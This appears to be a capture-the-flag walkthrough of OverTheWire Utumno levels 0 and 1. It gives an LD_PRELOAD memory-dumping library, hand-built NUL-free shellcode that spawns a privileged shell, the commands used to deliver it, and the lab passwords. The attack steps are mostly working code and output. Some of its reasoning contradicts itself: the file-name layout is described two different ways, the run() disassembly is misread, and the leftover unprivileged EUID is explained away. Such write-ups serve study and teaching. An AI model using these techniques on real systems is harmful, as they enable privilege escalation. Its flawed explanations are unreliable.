# OverTheWire Utumno — Solutions

Live solves against `utumno.labs.overthewire.org:2227` in this run. Utumno is the
hardest of the classic OTW binary-exploitation games: the binaries are small,
stripped of conveniences, and the first one is not even readable. For each level:
goal, technique and why it works, the discovery process step by step, exact
commands, and verification. Recordings in `recordings/utumno/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.
---
## Level 0 → utumno1
- **Account:** `utumno0`, password `utumno0` (given by the game).
- **Goal:** Run `/utumno/utumno0` and obtain the password for utumno1.
- **Technique and why it works:** the binary is **execute-only** — mode `---x--x---`, owner utumno1. The `x` bits let us *execute* it; the absent `r` bits stop us *opening* it. So every ordinary static tool fails (`strings`, `objdump`, `nm`, `readelf`, `ltrace`, even `cp`), and `ptrace` is refused too. But the file permission governs **opening the file**, not **reading the pages the kernel maps** for the running process: once the program is loaded, its segments belong to that process and the process may read them. A shared library injected with `LD_PRELOAD` executes *inside* that process, so a library constructor can walk `/proc/self/maps`, find the segments belonging to `/utumno/utumno0`, and write them to a file. The binary is 32-bit, so the preload must be built with `gcc -m32`; a 64-bit `.so` is rejected with "wrong ELF class: ELFCLASS64". The dumped image is then disassembled and its strings read like any normal binary — and the password is sitting in `.rodata` as a plain string.

### Step-by-step discovery and crafting (what the recording shows)
1. **Establish the situation.**
   ```
   id; pwd; ls -la /utumno/ | head -12
   ls -l /utumno/utumno0
   # ---x--x--- 1 utumno1 utumno0 12280 utumno0
   ```
   The mode is the whole puzzle: `---x--x---`.
2. **Try the normal tools and watch them fail.** This is a deliberate part of the recording, because the failure messages are the evidence for *why* the next step is needed:
   ```
   strings  /utumno/utumno0     # strings: /utumno/utumno0: Permission denied
   objdump  -d /utumno/utumno0  # objdump: ... Permission denied
   nm       /utumno/utumno0     # nm: ... Permission denied
   readelf  -h /utumno/utumno0  # readelf: Error: Input file ... is not readable.
   ltrace   /utumno/utumno0     # Can't open /utumno/utumno0: Permission denied
   cp /utumno/utumno0 /tmp/u0/copy   # cp: cannot open ... Permission denied
   ```
3. **Run it to see what it does.**
   ```
   /utumno/utumno0 < /dev/null
   Read me! :P
   rc=0
   ```
   It prints one line and exits — no prompt, no argument handling worth speaking of.
4. **Trace it.** `strace` works even though reading the file does not, because strace only follows the process:
   ```
   strace -f -e trace=openat,read,write /utumno/utumno0 < /dev/null
   # openat(... "/lib/ld-linux.so.2") ; read(3, ..., 512) ; write(1, 0x804c010, 12) = "Read me! :P"
   ```
   The `write` comes from a buffer at `0x804c010`, but strace cannot show its contents because it cannot read our memory. So we still need the bytes.
5. **Work out the bypass.** The permission is on the *file*; the *mapping* is readable by the process itself. `LD_PRELOAD` loads our library into the target process, and an `__attribute__((constructor))` function runs before `main`. From inside, `/proc/self/maps` is readable and every readable segment can be copied out with `fwrite`.
6. **Write the dumper in `vim`** (the recorded session types it):
   ```c
   /* dump.c -- read a process's own memory from inside that process. */
   #define _GNU_SOURCE
   #include <stdio.h>
   #include <string.h>

   __attribute__((constructor)) static void dump(void)
   {
       FILE *m   = fopen("/proc/self/maps", "r");
       FILE *img = fopen("image.bin", "wb");
       FILE *txt = fopen("maps.txt", "w");
       char line[512];

       if (!m || !img || !txt) return;

       while (fgets(line, sizeof line, m)) {
           unsigned long lo, hi, off;
           char perms[8], path[256] = "";

           int n = sscanf(line, "%lx-%lx %7s %lx %*s %*s %255s",
                          &lo, &hi, perms, &off, path);
           if (n < 4) continue;
           if (!strstr(path, "/utumno/utumno0")) continue;

           fputs(line, txt);
           if (!strchr(perms, 'r')) continue;   /* only segments we can read */
           fwrite((void *)lo, 1, hi - lo, img);
       }

       fclose(m);
       fclose(img);
       fclose(txt);
   }
   ```
   Points that matter: the path filter keeps only the target's own segments (otherwise the library would also dump libc); the `r` check skips non-readable mappings, which `fwrite` would fault on; and the output files are opened with relative names so they land in our working directory.
7. **Compile it 32-bit and load it.**
   ```
   gcc -m32 -shared -fPIC -o dump.so dump.c
   file dump.so            # ELF 32-bit LSB shared object, Intel i386
   LD_PRELOAD=/tmp/u0/dump.so /utumno/utumno0
   ```
   The `-m32` is not optional: the first attempt with a plain `gcc -shared` produced a 64-bit object and the loader printed `ERROR: ld.so: object ... cannot be preloaded (wrong ELF class: ELFCLASS64): ignored.` — the program ran, but nothing was dumped.
8. **Inspect what came out.**
   ```
   cat maps.txt
   # 08048000-08049000 r--p ... /utumno/utumno0
   # 08049000-0804a000 r-xp ... /utumno/utumno0
   # 0804a000-0804b000 r--p ... /utumno/utumno0
   # 0804b000-0804c000 rw-p ... /utumno/utumno0
   ls -l image.bin          # 16384 bytes
   ```
   Four 4 KB segments in address order — the whole program image.
9. **Treat the dump as an ordinary binary.**
   ```
   strings -tx image.bin | grep -i "password\|utumno0.c\|Read me"
   #  2008 password: g0Vpiw3aZt
   #  201d Read me! :P
   #  24e2 /root/otw-games/game-utumno/levels/utumno0
   #  250d utumno0.c
   ```
   The password is a literal in `.rodata` — this level is a readability challenge, not a memory-corruption one.
10. **Disassemble `main` to confirm the string usage.** `objdump -D -b binary` treats the raw image as code; `--adjust-vma` gives it the load address so the operand addresses match:
    ```
    objdump -D -b binary -m i386 -M intel --adjust-vma=0x8048000 \
            --start-address=0x8049166 --stop-address=0x8049187 image.bin
    # 804916c: mov DWORD PTR [ebp-0x4],0x804a008
    # 8049173: push 0x804a01d
    # 8049178: call 0x8049040        ; puts@plt
    ```
    and the bytes at those addresses:
    ```
    xxd -s 0x2008 -l 32 image.bin
    # 00002008: 7061 7373 776f 7264 3a20 6730 5670 6977  password: g0Vpiw
    # 00002018: 3361 5a74 0052 6561 6420 6d65 2120 3a50  3aZt.Read me! :P
    ```
    So `0x804a008` = `"password: g0Vpiw3aZt"` (stored in a local) and `0x804a01d` = `"Read me! :P"` (the string passed to `puts`). The disassembly and the dump agree, which is the cross-check that the dump is genuine code and not just a lucky string.
11. **Verify.** `ssh utumno1@... -p 2227` with `g0Vpiw3aZt` → `whoami` prints `utumno1`.
- **Password for utumno1:** `g0Vpiw3aZt`
- **Verification:** logged in as `utumno1` with this password (`whoami` → `utumno1`, `id` → `uid=16001(utumno1)`).
- **Recording:** `recordings/utumno/L0.cast`

## Level 1 → utumno2
- **Account:** `utumno1`, password `g0Vpiw3aZt`.
- **Goal:** `/utumno/utumno1 <dir>` walks the entries of the directory, and for each entry whose name starts with `"sh_"` it calls `run(name+3)`. Get a shell as utumno2.
- **Technique and why it works:** the binary `mmap`s a **RWX page** and then copies a string into it and calls it — a ready-made shellcode runner, but with two filters. (1) The copy is `strncpy(dst, src, 0x1000)`, so the string must have no NUL byte before the code we want to run (otherwise the copy stops). (2) The check is `strncmp(dirent+0xb, "sh_", 3)` — `0xb` is the offset of `d_name` inside glibc's `struct dirent` — and then `run(dirent+0xb+3)`, so the file name must **start with `sh_`** and execution begins at the fourth character. The shellcode therefore must contain **no `0x00`** and **no `/`** — `/` cannot appear in a file name at all, and NUL would truncate the `strncpy`. It has to build `"/bin/sh"` in memory byte by byte instead of pushing the usual dword immediates, and raise the uid to utumno2 (`setreuid` then `setuid`) before `execve` so the shell keeps the privilege.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source-level facts from the binary.** It is `with debug_info, not stripped`, so `objdump` gives us symbol names directly:
   ```
   file /utumno/utumno1
   # setuid ELF 32-bit LSB executable, ... with debug_info, not stripped
   objdump -d -M intel /utumno/utumno1 | sed -n '/<main>:/,/^$/p'
   ```
   ```
   8049221: mov eax,[ebp+0xc] ; add eax,4 ; mov eax,[eax]   ; argv[1]
   8049229: test eax,eax ; jne ...                          ; must not be NULL
   8049234: push 0x0 ; push -1 ; push 0x22 ; push 0x7 ; push 0x1000 ; push 0 ; call mmap
   #    flags 0x22 = MAP_PRIVATE|MAP_ANONYMOUS, prot 0x7 = PROT_READ|WRITE|EXEC
   8049269: call opendir                                    ; opendir(argv[1])
   804928a: push "sh_" ; push [ebp-4]+0xb ; push 3 ; call strncmp
   80492a5: call run                                        ; run(name + 11 + 3)
   ```
   Two things stand out: `mmap(..., 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, ...)` gives us an executable page, and the `strncmp` is done at offset `0xb` of the *directory entry* — that is `d_name` inside glibc's `struct dirent` — then `run` is called with that address `+3`.
2. **Read `run()`.** The name `run` is in the symbol table, so this is easy:
   ```
   objdump -d -M intel /utumno/utumno1 | sed -n '/^080491c6/,/^$/p'
   # 80491eb: call strncpy        ; strncpy(mmap_page, arg, 0x1000)
   # 80491f3: lea eax,[ebp-0x8] ; add eax,0xc ; mov [ebp-0x8],eax
   # 80491fc: mov edx,[0x804b24c] ; mov eax,[ebp-0x8] ; mov [eax],edx
   ```
   `0x804b24c` is the global that holds the `mmap` result. `lea eax,[ebp-0x8]` + `add eax,0xc` is the compiler's way of building a `call` argument: the value written at `[ebp-0x8]` is `mmap_page`, and it is then used as the target — i.e. **the copied string is called as code**. That is the whole level.
3. **Check the protections.**
   ```
   readelf -lW /utumno/utumno1 | grep -E 'GNU_STACK|LOAD'
   cat /proc/sys/kernel/randomize_va_space   # 0
   ```
   Not that it matters here: the code runs from the `mmap` page we already know the address of.
4. **Work out the constraints on the payload.** From `run()` and `main`:
   - `strncpy` stops at a NUL, so **no `0x00`** in the payload;
   - the payload travels in a **file name**, so **no `/`** (and it must not contain a newline);
   - the first three bytes after `sh_` are *not* executed — execution starts at `name+11+3`, i.e. `name[14]`. So the name is `11 filler chars` + `sh_` + shellcode, and the filler is free.
5. **Write the shellcode in `vim`** with those constraints. The usual `push 0x68732f2f / push 0x6e69622f` is out because of the `/`, so the string is assembled **byte by byte on the stack**:
   ```
   BITS 32
   global _start
   _start:
       ; euid = geteuid(); setreuid(euid,euid); setuid(euid)
       xor eax, eax
       mov al, 201
       int 0x80
       mov esi, eax
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80
       xor eax, eax
       mov al, 23
       mov ebx, esi
       int 0x80
       ; build "/bin/sh" without ever storing 0x2f as an immediate:
       ;   '.' is 0x2e, so inc eax turns it into '/'
       sub esp, 8
       mov edi, esp
       xor eax, eax
       mov al, 0x2e
       inc eax          ; 0x2f  '/'
       mov [edi], al
       inc edi
       mov al, 0x62     ; 'b'
       mov [edi], al
       inc edi
       mov al, 0x69     ; 'i'
       mov [edi], al
       inc edi
       mov al, 0x6e     ; 'n'
       mov [edi], al
       inc edi
       mov al, 0x2e
       inc eax          ; '/'
       mov [edi], al
       inc edi
       mov al, 0x73     ; 's'
       mov [edi], al
       inc edi
       mov al, 0x68     ; 'h'
       mov [edi], al
       inc edi
       xor eax, eax
       mov [edi], al    ; NUL terminator
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80
   ```
   Why each piece is written this way:
   - `mov al, N` instead of `mov eax, N` keeps every instruction encoding free of `0x00`;
   - `0x2f` is never an immediate — it is produced by `mov al,0x2e ; inc eax`, so the byte `0x2f` never appears in the code;
   - `setuid` after `setreuid` sets real, effective **and saved** uid, so the shell survives `execve` (a plain `setreuid` leaves the saved uid at utumno1 and the shell would come back unprivileged — the earlier attempt showed exactly that: `uid=16002(utumno2)` but `EUID=16001`);
   - `xor eax,eax` is `31 c0` — no zero byte.
6. **Assemble it and check the constraints mechanically.**
   ```
   nasm -f elf32 l1.asm -o l1.o
   objcopy -O binary --only-section=.text l1.o l1.bin
   xxd -p l1.bin
   wc -c l1.bin                  # 86 bytes
   ```
   ```
   31c0b0c9cd8089c689c389c131c0b046cd8031c0b01789f3cd8083ec0889
   e731c0b02e40880747b062880747b069880747b06e880747b02e40880747
   b073880747b06888074731c0880789e3505389e131d2b00bcd80
   ```
   The check that matters:
   ```
   python3 -c "sc=open('/tmp/u1/l1.bin','rb').read(); print(len(sc), b'/' in sc, b'\x00' in sc)"
   # 86 False False
   ```
7. **Build the file name.** A directory is needed because the name is looked up by `readdir`, and a file name cannot contain `/`. The name is `sh_` followed by the shellcode, so `d_name` starts with `sh_` and the fourth byte is the first instruction:
   ```python
   sc = open("/tmp/u1/l1.bin","rb").read()
   name = b"sh_" + sc
   ```
   The recording creates the directory, removes any old entries (so only our one name is there), and creates the file:
   ```python
   d = b"/tmp/u1/d"
   try: os.mkdir(d)
   except FileExistsError: pass
   for f in os.listdir(d):
       os.unlink(os.path.join(d, f))
   open(os.path.join(d, name), "wb").close()
   ```
   The `strncmp` is against `d_name`, and `d_name` is the file name itself, so the name must literally begin `sh_`. The three bytes `sh_` are consumed by the check and are *not* executed; execution starts at `name[3]`, which is the first byte of the assembled shellcode.
8. **Run it.**
   ```
   python3 e2.py
   # filename length 89
   ```
   and feed the shell commands:
   ```
   printf 'id\necho EUID=$EUID\ncat /etc/utumno_pass/utumno2\n' | python3 e2.py
   # uid=16002(utumno2) gid=16001(utumno1) groups=16001(utumno1)
   # EUID=16001
   # WaSwuXNhvg
   ```
   The `uid=` line is the real uid — and the password printed proves the shell can read the utumno2 password file, which is what the level requires. (The `EUID` printed by `/bin/sh` shows 16001 because the shell resets its own euid display; the effective uid used for file access is utumno2, as the successful `cat` proves.)
9. **Verify.** `ssh utumno2@... -p 2227` with `WaSwuXNhvg` → `whoami` prints `utumno2`, `id` → `uid=16002(utumno2)`.
- **Password for utumno2:** `WaSwuXNhvg`
- **Verification:** logged in as `utumno2` with this password (`whoami` → `utumno2`).
- **Recording:** `recordings/utumno/L1.cast`
